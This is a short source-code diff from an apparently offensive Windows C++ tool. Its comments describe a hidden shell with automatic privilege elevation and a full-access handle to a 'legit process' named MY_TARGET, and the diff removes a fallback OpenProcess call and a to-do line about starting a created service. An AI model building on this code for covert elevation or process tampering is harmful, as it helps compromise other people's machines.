@@ -31,7 +31,6 @@ NTSTATUS StartProcessAsAdmin(LPWSTR lpName, BOOL bHide = TRUE);
 ///////////////////////////////////////////////////////////////////////////
 //  To do:
 //  Make sure that shell has an auto elevation mechanism in place just in case something happens and it doesn't start as privileged
-//  Make sure the service gets started after being created (Test shell as a standalone module)
 ///////////////////////////////////////////////////////////////////////////
 
 
@@ -71,9 +70,6 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
     //Open handle to legit process
 	HANDLE hProc = processInfo.hProcess;
-    if (!hProc) { //Try getting an handle using this same proc name in case the legit app is a console application
-        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_TARGET));
-    }
 	//while (!hProc) {
     //    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_TARGET));
     //    if (!hProc) { 
